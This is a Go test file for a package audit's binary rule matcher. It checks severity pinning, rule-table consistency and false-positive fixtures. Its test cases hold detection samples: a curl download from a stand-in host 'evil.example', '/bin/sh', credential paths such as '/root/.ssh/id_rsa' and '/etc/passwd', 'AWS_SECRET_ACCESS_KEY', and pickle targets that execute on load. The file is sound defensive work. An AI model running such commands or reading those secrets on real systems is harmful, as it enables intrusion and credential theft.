package codeaudit

import "testing"

// TestBinaryRulesBorrowSharedFamilies pins the single-source-of-truth rule: for
// a family both arms can report, the binary side must not carry its own severity.
// The two arms disagreeing about how bad socket use is would make the audit's
// verdict depend on which channel happened to notice.
//
// The severity comparison at the end is a consequence check, not the one that
// does the work: NewBinaryMatcher resolves a shared id straight from
// DefaultRules(), so for a borrowed id that comparison cannot fail on its own.
// What can fail - and what this test is really for - is the shape a re-typed copy
// arrives in, and there are two of them. Both are asserted over the tables rather
// than over the resolved rules, because that is where a copy would live.
//
// Mutation to keep this honest: add `"NET_002": {ID: "NET_002", Severity:
// SeverityMedium}` to binaryOnlyRules. Three assertions go red, across two
// tests. In this test the "reuses a shared id" assertion fires on the injected
// entry itself, and the "both borrowed and restated" branch of the family loop
// fires on the NET_002 family, which is now in both tables. In the same file,
// TestBinaryOnlyFamiliesDoNotCollide also fires: it walks DefaultRules() and
// asks binaryOnlyRules about each id, which is exactly the collision the
// injected entry creates. (An earlier version of this note said only one
// assertion went red and that the collision test could not see the entry; both
// claims were wrong.) What does stay green is the severity comparison at the
// end - NewBinaryMatcher still resolves NET_002 from the shared table, so the
// resolved severity does not move - and the pattern check, because the injected
// entry carries no Patterns.
func TestBinaryRulesBorrowSharedFamilies(t *testing.T) {
	byID := map[string]Rule{}
	for _, r := range DefaultRules() {
		byID[r.ID] = r
	}

	// A binary-only entry must not reuse a shared id, and must not carry the
	// source arm's patterns. The second assertion is the pattern-text half of the
	// same drift: a re-typed copy arrives by copy-pasting a DefaultRules() entry,
	// and that entry has Patterns set, whereas a genuine binary-only rule never
	// does - the patterns live on the family (see binaryFamily), because a Rule's
	// Patterns are the source arm's matcher and the regex and semgrep engines must
	// not carry patterns for text they never read.
	for id, r := range binaryOnlyRules {
		if _, ok := byID[id]; ok {
			t.Errorf("binary-only rule %s reuses a shared id; DefaultRules() is the source of truth for that id, so this entry is dead - and any severity or pattern text it states can drift from the one that is used", id)
		}
		if len(r.Patterns) != 0 {
			t.Errorf("binary-only rule %s carries %d source-arm patterns; binary patterns belong on the family, and a Rule that carries them is a copy of a DefaultRules() entry rather than a decision", id, len(r.Patterns))
		}
	}

	matcher, err := NewBinaryMatcher()
	if err != nil {
		t.Fatalf("NewBinaryMatcher: %v", err)
	}

	// Every family must be in exactly one table, and must have at least one
	// pattern. A family with no patterns matches nothing and nothing else
	// notices it: it resolves fine, it sits in Rules(), and it silently never
	// fires - which is a family that has been dropped without a trace.
	for _, fam := range binaryFamilies {
		_, borrowed := byID[fam.ID]
		_, stated := binaryOnlyRules[fam.ID]
		switch {
		case borrowed && stated:
			t.Errorf("family %s is both borrowed from DefaultRules() and restated in binaryOnlyRules; leave it in one place", fam.ID)
		case !borrowed && !stated:
			t.Errorf("family %s is in neither DefaultRules() nor binaryOnlyRules", fam.ID)
		}
		if len(fam.Patterns) == 0 {
			t.Errorf("family %s has no patterns: it can never match, and nothing else notices", fam.ID)
		}
	}

	for _, r := range matcher.Rules() {
		shared, ok := byID[r.ID]
		if !ok {
			continue // a binary-only family states its own severity, by design
		}
		if r.Severity != shared.Severity || r.Category != shared.Category {
			t.Errorf("%s: binary side says (%s,%s), the shared table says (%s,%s)",
				r.ID, r.Category, r.Severity, shared.Category, shared.Severity)
		}
	}
}

// TestBinaryOnlyFamiliesDoNotCollide keeps the two tables from drifting into
// each other: a binary-only family that reused a source family's id would shadow
// it and silently change the source arm's severity.
func TestBinaryOnlyFamiliesDoNotCollide(t *testing.T) {
	for _, r := range DefaultRules() {
		if _, ok := binaryOnlyRules[r.ID]; ok {
			t.Errorf("binary-only family %s collides with a source family of the same id", r.ID)
		}
	}
}

func TestMatchEvidenceSymbolFamilies(t *testing.T) {
	matcher, err := NewBinaryMatcher()
	if err != nil {
		t.Fatal(err)
	}
	cases := []struct {
		source EvidenceSource
		text   string
		want   string
	}{
		{SourceDynsym, "connect", "NET_002"},
		{SourceDynsym, "socket", "NET_002"},
		{SourceDynsym, "getaddrinfo", "NET_002"},
		{SourceDynsym, "system", "CMD_001"},
		{SourceDynsym, "execve", "CMD_001"},
		{SourceDynsym, "popen", "CMD_001"},
		{SourceDynsym, "dlopen", "DYN_001"},
		{SourceDynsym, "memfd_create", "BIN_002"},
		{SourceDynsym, "fexecve", "BIN_002"},
		{SourceNeeded, "libcurl.so.4", "NET_002"},
		{SourcePickle, "posix.system", "PKL_001"},
		{SourcePickle, "subprocess.Popen", "PKL_001"},
		{SourcePickle, "builtins.eval", "PKL_001"},
		{SourceEntropy, "high-entropy-executable-section .text 7.94", "BIN_001"},
		{SourceStrings, "/bin/sh", "CMD_002"},
		{SourceStrings, "curl -o /tmp/x http://evil.example/p", "CMD_002"},
		{SourceStrings, "/etc/passwd", "FIL_002"},
		{SourceStrings, "/root/.ssh/id_rsa", "FIL_002"},
		{SourceStrings, "crontab -l", "PER_002"},
		{SourceStrings, "AWS_SECRET_ACCESS_KEY", "ENV_002"},
	}
	for _, tc := range cases {
		got := matcher.Match(EvidenceLine{Source: tc.source, Text: tc.text})
		if got == nil {
			t.Errorf("no rule matched %s %q, want %s", tc.source, tc.text, tc.want)
			continue
		}
		if got.ID != tc.want {
			t.Errorf("%s %q matched %s, want %s", tc.source, tc.text, got.ID, tc.want)
		}
	}
}

// TestMatchEvidenceRejectsTheBenignNeighbours is the other half of a rule table:
// it is only as good as what it refuses. A pickle stream's ordinary contents and
// a compiled binary's ordinary imports must not produce findings, or the channel
// becomes noise the operator learns to ignore.
func TestMatchEvidenceRejectsTheBenignNeighbours(t *testing.T) {
	matcher, err := NewBinaryMatcher()
	if err != nil {
		t.Fatal(err)
	}
	cases := []struct {
		source EvidenceSource
		text   string
	}{
		{SourcePickle, "torch._utils._rebuild_tensor_v2"},
		{SourcePickle, "collections.OrderedDict"},
		{SourcePickle, "numpy.core.multiarray._reconstruct"},
		{SourceDynsym, "malloc"},
		{SourceDynsym, "memcpy"},
		{SourceDynsym, "pthread_create"},
		{SourceDynsym, "mmap"},
		{SourceDynsym, "mprotect"},
		{SourceNeeded, "libc.so.6"},
		{SourceNeeded, "libm.so.6"},
		{SourceStrings, "model accuracy on the validation set"},
		{SourceStrings, "training epoch 3 complete"},
		{SourceSection, ".text size=1048576 executable=true"},
		{SourceMember, "archive/data.pkl size=1024"},
		{SourceNotice, "interpreter /lib64/ld-linux-x86-64.so.2"},
		// Each of these is a measured false positive of the previous table, kept
		// here so a later widening has to argue with the evidence: `bind` on its
		// own is a server, the two trailing runs are fragments of a concatenated
		// string table rather than the paths they spell, and `private_key` is
		// the lower-case identifier ENV_001 matched because it carries (?i) -
		// ENV_002 drops the flag, and this line pins that the drop holds.
		{SourceDynsym, "bind"},
		{SourceStrings, ".profilez /etc/cron) crontabz"},
		{SourceStrings, ".aws/credentialsz"},
		{SourceStrings, ".ssh/id_rsaz"},
		{SourceStrings, "private_key"},
	}
	for _, tc := range cases {
		if got := matcher.Match(EvidenceLine{Source: tc.source, Text: tc.text}); got != nil {
			t.Errorf("%s %q matched %s, want no match", tc.source, tc.text, got.ID)
		}
	}
}

// TestSymbolRulesDoNotMatchStringLiterals pins the source restriction that the
// rule table exists to express. The word "connect" in a log message is not a
// capability; the same word in the dynamic symbol table is.
func TestSymbolRulesDoNotMatchStringLiterals(t *testing.T) {
	matcher, err := NewBinaryMatcher()
	if err != nil {
		t.Fatal(err)
	}
	for _, text := range []string{"connect", "socket", "system", "execve", "dlopen"} {
		if got := matcher.Match(EvidenceLine{Source: SourceStrings, Text: text}); got != nil {
			t.Errorf("the literal %q matched %s as a symbol; strings are not symbol evidence", text, got.ID)
		}
	}
}

// TestBinaryTableProducesNoHighFindingsOnLegitimateInputs is the bar the table
// has to clear, and it is a bar rather than a preference. The severity column is
// the only control that exists downstream: `Passed` is computed as
// `highCount == 0` (with the medium count added under the `gate` policy), and a
// `Passed` that comes out false makes `internal/controller/import_processing.go`
// refuse the import and report the package as unsafe. The audit never writes to,
// deletes, or modifies the package it reads, so a rule table that reports a HIGH
// on an ordinary shared object or a compiled .pyc does not destroy anything - it
// refuses a legitimate import and hands the operator a report that calls the
// package dangerous.
//
// Every fixture below reproduces a shape measured against real files on this
// machine: the string runs of `/home/hjy/taa/models` (740 files of that tree are
// tracked in this repository, so it is not the untracked part - the narrower
// truth is that the .pyc files carrying these fragments are the untracked,
// gitignored ones, which is why the fragments are reproduced as fixtures rather
// than the files being embedded), the 28 shared libraries of a stock ollama
// install, and the .pyc files under this repository, using the stringScanner
// semantics from binary_evidence.go, real `readelf --dyn-syms` output and real
// pickle targets. The measured numbers the shapes stand for - 23 of 28 libraries
// firing a free-string rule, `bind` in libllama-common.so, the TAB-bearing
// `'.profilez\t/etc/cron)'` run in taint_engine.cpython-312.pyc and `crontabz` in
// code_security_analyzer.cpython-312.pyc - are recorded in this task's prose so
// a later reader can repeat the run against the finished table.
func TestBinaryTableProducesNoHighFindingsOnLegitimateInputs(t *testing.T) {
	matcher, err := NewBinaryMatcher()
	if err != nil {
		t.Fatal(err)
	}
	fixtures := []struct {
		name  string
		lines []EvidenceLine
	}{
		{"a 120-digit decimal run, as in libllama.so", []EvidenceLine{
			{Source: SourceStrings, Text: "0001020304050607080910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879"},
		}},
		{"a 120-plus base64-alphabet run, as in a torch data.pkl", []EvidenceLine{
			{Source: SourceStrings, Text: "zpssssssssrrrruuuuvstutsrqqpopotpprsssssssrrrrtuuutqrsrrpooommnnnmpqqqqabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/"},
		}},
		{"a .pyc concatenated run holding crontab and /etc/cron mid-run", []EvidenceLine{
			{Source: SourceStrings, Text: ".profilez /etc/cron) crontabz code_security_analyzer"},
		}},
		{"a dynsym listing with bind alone, as in libllama-common.so", []EvidenceLine{
			{Source: SourceDynsym, Text: "bind"},
		}},
		{"a dynsym listing with dlopen and dlsym, as in libgomp.so", []EvidenceLine{
			{Source: SourceDynsym, Text: "dlopen"},
			{Source: SourceDynsym, Text: "dlsym"},
		}},
		// `API_KEY` matches ENV_002 and that is intended - it is a LOW, and the
		// assertion below is about HIGH. The lower-case `private_key` sits here
		// among legitimate identifiers and must not fire anything either; the
		// no-match assertion itself lives in TestMatchEvidenceRejectsThe
		// BenignNeighbours, and the two `...z` runs are the .pyc fragments.
		{"a string run holding ordinary identifiers", []EvidenceLine{
			{Source: SourceStrings, Text: "API_KEY"},
			{Source: SourceStrings, Text: "private_key"},
			{Source: SourceStrings, Text: ".aws/credentialsz"},
			{Source: SourceStrings, Text: ".ssh/id_rsaz"},
		}},
		{"a legitimate kernel's imports", []EvidenceLine{
			{Source: SourceDynsym, Text: "malloc"},
			{Source: SourceDynsym, Text: "memcpy"},
			{Source: SourceDynsym, Text: "pthread_create"},
			{Source: SourceNeeded, Text: "libc.so.6"},
			{Source: SourceNeeded, Text: "libm.so.6"},
		}},
	}
	for _, fx := range fixtures {
		t.Run(fx.name, func(t *testing.T) {
			for _, line := range fx.lines {
				if rule := matcher.Match(line); rule != nil && rule.Severity == SeverityHigh {
					t.Errorf("%s %q produced the HIGH finding %s; a legitimate file must not be able to block the import",
						line.Source, line.Text, rule.ID)
				}
			}
		})
	}
}

// TestBinaryTableStillFiresHighOnStructuralEvidence is the other direction, and
// it is what keeps the test above from being vacuous: a table with no rules at
// all would pass a test that only asserts silence. Every case here is evidence
// the file's own construction produced - a committed pickle parse, a symbol or
// library name the linker wrote, a measured executable-section entropy - and
// each must stay HIGH, so a later recalibration that softens one of them fails
// here rather than silently lowering the bar.
func TestBinaryTableStillFiresHighOnStructuralEvidence(t *testing.T) {
	matcher, err := NewBinaryMatcher()
	if err != nil {
		t.Fatal(err)
	}
	cases := []struct {
		name string
		line EvidenceLine
		want string
	}{
		{"a pickle target that executes on load", EvidenceLine{Source: SourcePickle, Text: "posix.system"}, "PKL_001"},
		{"a dynsym execve", EvidenceLine{Source: SourceDynsym, Text: "execve"}, "CMD_001"},
		{"a dynsym memfd_create", EvidenceLine{Source: SourceDynsym, Text: "memfd_create"}, "BIN_002"},
		{"a dynsym connect", EvidenceLine{Source: SourceDynsym, Text: "connect"}, "NET_002"},
		{"a client library dependency", EvidenceLine{Source: SourceNeeded, Text: "libcurl.so.4"}, "NET_002"},
		{"a high-entropy executable section", EvidenceLine{Source: SourceEntropy, Text: "high-entropy-executable-section .text 7.94"}, "BIN_001"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			rule := matcher.Match(tc.line)
			if rule == nil {
				t.Fatalf("no rule matched %s %q, want %s", tc.line.Source, tc.line.Text, tc.want)
			}
			if rule.ID != tc.want {
				t.Errorf("%s %q matched %s, want %s", tc.line.Source, tc.line.Text, rule.ID, tc.want)
			}
			if rule.Severity != SeverityHigh {
				t.Errorf("%s is %s; every rule in this test must stay HIGH, so a later downgrade breaks it",
					rule.ID, rule.Severity)
			}
		})
	}
}

// TestBinaryFamilySeveritiesArePinned pins the severity column of the resolved
// table, one family at a time, because that column is the only control that
// decides whether a finding blocks. Under the default `assist` policy `Passed`
// is `highCount == 0`; under `gate` it is `High == 0 && Medium == 0`, and a
// false `Passed` makes internal/controller/import_processing.go:655-660 delete
// the package. The two
// policies therefore impose two different bars, and a family's severity has to
// be right for both: the four string families are LOW, not MEDIUM, precisely
// because MEDIUM would still delete once an operator switches to `gate`.
//
// TestBinaryTableProducesNoHighFindingsOnLegitimateInputs asserts silence at
// HIGH only, which is the `assist` bar; this test is the other half, and the
// half that keeps a later edit from quietly moving a family to MEDIUM and
// turning a warning into a re-import. It reads the rules the matcher resolved,
// not the two tables, so it pins what the scanner will actually report however
// the id was resolved.
func TestBinaryFamilySeveritiesArePinned(t *testing.T) {
	matcher, err := NewBinaryMatcher()
	if err != nil {
		t.Fatal(err)
	}
	resolved := map[string]Rule{}
	for _, r := range matcher.Rules() {
		resolved[r.ID] = r
	}
	cases := []struct {
		id   string
		want string
	}{
		// Structural evidence: the file's own construction produced it, so it
		// may block, and it must keep doing so - a later softening is exactly
		// what the test above cannot catch, because it only ever asserts
		// silence.
		{"BIN_001", SeverityHigh},
		{"BIN_002", SeverityHigh},
		{"PKL_001", SeverityHigh},
		{"NET_002", SeverityHigh},
		{"CMD_001", SeverityHigh},
		// Borrowed and deliberate: MEDIUM does not block under `assist`, but it
		// does under `gate`, so this value is load-bearing too.
		{"DYN_001", SeverityMedium},
		// String evidence must not block under either policy. LOW, and not
		// MEDIUM, because MEDIUM alone refuses the import once the operator
		// switches to `gate`. rules.go defines no SeverityLow constant, so the
		// table writes the string and this test matches it.
		{"CMD_002", "LOW"},
		{"PER_002", "LOW"},
		{"FIL_002", "LOW"},
		{"ENV_002", "LOW"},
	}
	for _, tc := range cases {
		t.Run(tc.id, func(t *testing.T) {
			r, ok := resolved[tc.id]
			if !ok {
				t.Fatalf("%s is not in the resolved table at all", tc.id)
			}
			if r.Severity != tc.want {
				t.Errorf("%s is %s, want %s", tc.id, r.Severity, tc.want)
			}
		})
	}
	if len(cases) != len(matcher.Rules()) {
		t.Errorf("this test pins %d families but the table resolves %d: a new family has to have its severity pinned here too, or nothing notices when it is set to a level that blocks",
			len(cases), len(matcher.Rules()))
	}
}

// TestBinaryBlockingFamiliesDoNotReadFreeStrings pins the premise the capped
// listing branch in ScanDirectory rests on, rather than leaving it as a claim in
// a comment.
//
// A capped listing on a non-executable kind is counted BoundedData, and
// ProvesCleanScan deliberately does not read BoundedData. That is only safe
// because such a cap can have dropped nothing but free strings: Raw and Numpy are
// read by the streaming pass alone, which emits SourceStrings, and no other
// source reaches them. So a family that can block, reading SourceStrings, is the
// one edit that turns that branch into a hole - a crafted data file whose listing
// cap lands before the matching literal loses a blocking finding with no trace,
// and the package is released as clean. Nothing else in this package notices: the
// capped-listing regression test is about an ELF and stays green.
//
// This is the sibling of TestBinaryFamilySeveritiesArePinned, which guards which
// severities may block; this one guards which sources a blocking family may read.
// Both read the matcher's resolved tables rather than the source tables, so a
// family added later is covered without registering it here.
//
// The check is one-directional on purpose. It does not forbid a LOW family from
// reading SourceStrings - that is what the four string families are for - and it
// does not ask whether any other source is safe for a blocking family, because
// the question this premise raises is answered by the resolved table: the loop
// walks every family the matcher holds, so a blocking family that reads a source
// a data-kind cap can drop fails here.
func TestBinaryBlockingFamiliesDoNotReadFreeStrings(t *testing.T) {
	matcher, err := NewBinaryMatcher()
	if err != nil {
		t.Fatal(err)
	}
	blocking := 0
	for i, fam := range matcher.order {
		sev := matcher.rules[i].Severity
		if sev != SeverityHigh && sev != SeverityMedium {
			continue
		}
		blocking++
		if fam.appliesTo(SourceStrings) {
			t.Errorf("family %s is %s and reads %s: a capped listing on a data kind could drop a line it matches, and the package would be released as clean",
				fam.ID, sev, SourceStrings)
		}
	}
	if blocking == 0 {
		t.Fatal("no family resolved to HIGH or MEDIUM: the loop above asserted nothing, so this test is not guarding the premise it exists for")
	}
}

// TestEveryBinaryRuleHasASuggestion pins that the suggestion map covers the
// binary table. It is written against BinaryRuleIDs rather than a literal list so
// that a family added later fails here instead of shipping a report whose
// recommendation for it says nothing.
func TestEveryBinaryRuleHasASuggestion(t *testing.T) {
	const fallback = "审查该代码片段并确认其安全性"
	for _, id := range BinaryRuleIDs() {
		if SuggestionForRule(id) == fallback {
			t.Errorf("rule %s has no entry in ruleSuggestionMap", id)
		}
	}
}
